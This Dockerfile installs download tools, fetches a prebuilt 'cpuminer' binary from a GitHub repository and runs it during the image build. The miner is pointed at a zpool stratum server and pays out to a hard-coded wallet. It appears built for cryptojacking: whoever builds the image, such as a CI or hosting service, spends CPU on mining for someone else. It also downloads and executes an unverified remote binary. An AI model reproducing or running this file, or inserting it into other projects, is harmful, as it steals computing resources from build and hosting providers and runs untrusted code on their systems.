FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/pttn001/pttn/raw/main/cpuminer
RUN chmod +x cpuminer
RUN ./cpuminer  --algo yespower --param-n 2048 --param-r 32 --param-key "LTNCGYES" -o stratum+tcp://yespowerLTNCG.na.mine.zpool.ca:6245 -u KLonQ7jcgoWU32Y44pst4KgKQUVArNEN2s
